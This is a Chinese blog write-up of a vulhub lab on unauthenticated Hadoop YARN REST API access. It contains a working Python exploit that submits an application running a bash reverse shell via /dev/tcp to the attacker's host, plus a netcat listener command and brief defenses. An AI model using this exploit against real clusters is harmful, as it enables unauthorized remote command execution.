# Hadoop未授权访问漏洞



#### 漏洞简介以及危害
Hadoop是一个由Apache基金会所开发的分布式系统基础架构,由于服务器器直接在开放了了
Hadoop 机器器 HDFS 的 50070 web 端口及部分默认服务口口,黑客可以通过命令行操作多个目录下
的数据,如进行删除,下载,目录浏览甚至命令行行等操作,产生极大的危害。



#### 环境
vulnhub



#### 测试
启动环境
```bash
docker-compose up -d
```

访问
```
http://192.168.0.100:8088/cluster
```
![](http://image.xpshuai.cn/Hadoop.png)


**通过REST API命令执行**
利用过程：
在本地监听端口 > 创建Application > 调用Submit Application API提交
1.本机监听
```bash
nc -lvvp 8888
```

2.直接本机执行EXP：`python exp.py`
```python
import requests
target = 'http://192.168.0.100:8088/'
lhost = '192.168.0.105' # put your local host ip here, and listen at port 8888
url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
'application-id': app_id,
'application-name': 'get-shell','am-container-spec': {
'commands': {
'command': '/bin/bash -i >& /dev/tcp/%s/8888 0>&1' % lhost,
},
},
'application-type': 'YARN',
}
requests.post(url, json=data)

```

3.反弹shell成功
![](http://image.xpshuai.cn/Hadoop_shell.png)


#### 防御手段
- 如无必要, 关闭 Hadoop Web 管理⻚面。
- 开启身份验证 ,防止未经授权用户访问。
- 设置“安全组”访问控制策略,将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访包括 50070 以及 WebUI 等相关端口。













---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://shuai06.github.io/hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/  

